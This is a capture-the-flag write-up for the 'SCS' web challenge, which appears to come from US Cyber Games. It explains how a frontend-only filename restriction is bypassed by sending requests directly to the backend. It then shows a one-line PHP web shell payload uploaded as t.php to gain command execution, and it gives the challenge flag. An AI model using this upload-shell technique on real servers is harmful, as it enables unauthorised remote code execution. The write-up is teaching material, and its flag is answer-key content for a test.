# SCS

## Description

SCS [Web]

We uncovered a code repository and it appears to be where ARIA is storing mission-critical code. We need to break in!

[https://uscybercombine-s4-scs.chals.io/](https://uscybercombine-s4-scs.chals.io/)

## Solution

![SCS](/assets/ctf/uscybergames/scs.png)

Uploaded files are placed in `/uploads` directory

![SCS-2](/assets/ctf/uscybergames/scs-2.png)

The technology used is PHP

![SCS-1](/assets/ctf/uscybergames/scs-1.png)

The frontend restricts using special characters: 
```http
Paste file name can only contain alphanumeric characters
```

But making direct request to backend it's bypassed:

![SCS-3](/assets/ctf/uscybergames/scs-3.png)

Upload shell:
```json
{
	"pasteContent": "<?PHP echo system($_REQUEST[0]); ?>",
	"pasteFileName":"t.php"
}
```

It works:
![SCS-4](/assets/ctf/uscybergames/scs-4.png)

After some enumeration we find location of real *flag.txt*
![SCS-5](/assets/ctf/uscybergames/scs-5.png)
::: tip Flag
`**SIVBGR{v@lidate_s3rver_s1de}**`
:::